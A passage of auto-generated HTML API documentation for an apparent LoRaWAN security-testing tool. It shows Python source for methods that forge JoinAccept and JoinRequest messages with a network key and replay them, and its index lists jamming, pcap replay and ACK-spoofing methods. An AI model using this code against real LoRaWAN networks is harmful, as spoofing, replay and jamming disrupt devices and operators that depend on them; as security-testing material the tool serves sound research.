    PAYLOAD = MHDR + JOIN_APP_NONCE + NET_ID + DEV_ADDR + OTHER

    PACKET = PHY + PAYLOAD + self.crypto_tool.compute_MIC(
        bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)), bytes.fromhex(PAYLOAD))

    ENC_PACKET = self.crypto_tool.encrypt_join_accept(PACKET, bytes.fromhex(
        self.session_manager.get_session_value(SessionParams.NwkKey)))

    self.__replay_message(ENC_PACKET)
    # Join-accept   MHDR | JoinNonce | NetID | DevAddr | DLSettings | RxDelay | CFList</code></pre>
</details>
</dd>
<dt id="src.player.Player.spoof_JoinRequest"><code class="name flex">
<span>def <span class="ident">spoof_JoinRequest</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"><p>Spoofs a LoRaWAN JoinRequest message.</p>
<p>Retrieves NwkKey from the session data and constructs the JoinRequest message payload based on the LoRaWAN specification. Computes the MIC using the NwkKey and replays the message.</p>
<h2 id="raises">Raises</h2>
<dl>
<dt><code>ValueError</code></dt>
<dd>If NwkKey is missing in the session data.</dd>
</dl></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def spoof_JoinRequest(self):
    &#34;&#34;&#34;Spoofs a LoRaWAN JoinRequest message.

    Retrieves NwkKey from the session data and constructs the JoinRequest message payload based on the LoRaWAN specification. Computes the MIC using the NwkKey and replays the message.

    Raises:
        ValueError: If NwkKey is missing in the session data.
    &#34;&#34;&#34;
    # join accept structure
    # https://lora-developers.semtech.com/documentation/tech-papers-and-guides/lorawan-device-activation/device-activation/
    if self.session_manager.get_session_value(SessionParams.NwkKey) is None:
        print(&#39;Missing NwkKey&#39;)
        return

    PHY = &#39;173180&#39;
    MHDR = &#39;00&#39;
    JOIN_APP_EUI = &#39;0000000000000000&#39;
    if self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI) is not None:
        JOIN_APP_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_JoinEUI)
    DEV_EUI = &#39;3333333333333333&#39;
    if self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI) is not None:
        DEV_EUI = self.session_manager.get_session_value(SessionParams.JoinRequest_DevEUI)
    DEV_NONCE = &#39;1237&#39;

    PAYLOAD = MHDR + JOIN_APP_EUI + DEV_EUI + DEV_NONCE
    MIC = self.crypto_tool.compute_MIC(bytes.fromhex(self.session_manager.get_session_value(SessionParams.NwkKey)),
                                       bytes.fromhex(PAYLOAD))

    PACKET = PHY + PAYLOAD + MIC

    self.__replay_message(PACKET)</code></pre>
</details>
</dd>
</dl>
<h3>Inherited members</h3>
<ul class="hlist">
<li><code><b><a title="src.command_handler.CommandHandler" href="command_handler.html#src.command_handler.CommandHandler">CommandHandler</a></b></code>:
<ul class="hlist">
<li><code><a title="src.command_handler.CommandHandler.execute_command" href="command_handler.html#src.command_handler.CommandHandler.execute_command">execute_command</a></code></li>
</ul>
</li>
</ul>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="src" href="index.html">src</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="src.player.Player" href="#src.player.Player">Player</a></code></h4>
<ul class="">
<li><code><a title="src.player.Player.configure_jammer" href="#src.player.Player.configure_jammer">configure_jammer</a></code></li>
<li><code><a title="src.player.Player.configure_transmitter" href="#src.player.Player.configure_transmitter">configure_transmitter</a></code></li>
<li><code><a title="src.player.Player.jam" href="#src.player.Player.jam">jam</a></code></li>
<li><code><a title="src.player.Player.replay_sequence_from_pcap" href="#src.player.Player.replay_sequence_from_pcap">replay_sequence_from_pcap</a></code></li>
<li><code><a title="src.player.Player.spoof_ACK" href="#src.player.Player.spoof_ACK">spoof_ACK</a></code></li>
<li><code><a title="src.player.Player.spoof_JoinAccept" href="#src.player.Player.spoof_JoinAccept">spoof_JoinAccept</a></code></li>
<li><code><a title="src.player.Player.spoof_JoinRequest" href="#src.player.Player.spoof_JoinRequest">spoof_JoinRequest</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>